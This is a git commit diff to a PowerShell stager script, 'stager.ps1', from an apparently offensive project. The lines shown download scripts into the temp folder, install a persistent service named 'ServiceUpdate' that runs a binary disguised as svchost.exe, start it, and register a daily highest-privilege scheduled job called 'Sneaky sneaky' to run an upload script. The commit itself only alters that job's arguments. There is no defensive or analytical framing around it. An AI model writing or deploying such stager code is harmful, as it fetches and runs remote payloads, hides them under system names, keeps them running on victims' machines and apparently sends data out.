fd7fe7923d020f0b807254e380ea7f0ea648daa5
malbrightin <49653292+malbrightin@users.noreply.github.com>
2019-04-24 11:42:37 -0400

    Update stager.ps1

--- stager.ps1
+++ stager.ps1
@@ -7,5 +7,5 @@ Invoke-WebRequest -Uri $url3 -OutFile "$env:temp\upload.ps1"
 & "$env:temp\AutoRun.ps1" -name "ServiceUpdate" -run "$env:temp\svchost.exe" -description "Service Updater"
 Start-Process -Filepath "$env:temp\svchost.exe"
 $Trigger = New-ScheduledTaskTrigger -At 10:00am -Daily
-$Action = New-ScheduledTaskAction -Execute "upload.ps1" -Argument "$env:temp\upload.ps1"
+$Action = New-ScheduledTaskAction -Execute "upload.ps1"
 Register-ScheduledJob -Name "Sneaky sneaky" -Trigger $Trigger -Action $Action -RunLevel Highest -Force
